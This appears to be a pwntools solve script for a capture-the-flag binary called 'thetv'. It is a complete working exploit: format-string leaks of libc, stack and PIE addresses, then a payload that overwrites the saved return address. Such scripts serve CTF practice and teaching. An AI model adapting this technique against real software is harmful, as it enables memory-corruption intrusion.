#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './thetv')


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *main+321
b *checkPin
b *main+829
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
# io = remote('0.cloud.chals.io', 30658)

io.sendlineafter(b'> ', b'p')
io.sendlineafter(b'> ', b'%27$p %10$p %29$p')

io.recvuntil(b'say: ')
libc_leak, stack_leak, pie_leak = io.recvline().strip().split(b' ')
libc_leak, stack_leak, pie_leak = int(libc_leak, 16), int(stack_leak, 16), int(pie_leak, 16)

exe.address = pie_leak - exe.sym.main
log.info(f'{exe.address = :#x}')

saved_rip = stack_leak+0x10
log.info(f'{stack_leak = :#x} {saved_rip = :#x}')

log.info(f'{exe.address + 0x17B8 = :#x}')


io.sendlineafter(b'> ', b'p')
fmt = fmtstr_payload(16, {saved_rip: p64(6)}, write_size='int')
assert len(fmt) < 64
io.sendlineafter(b'> ', fmt)

io.sendlineafter(b'> ', b'c')
io.sendlineafter(b'> ', b'y')
io.sendlineafter(b'> ', b'6')
io.sendlineafter(b': ', b'6')

io.interactive()

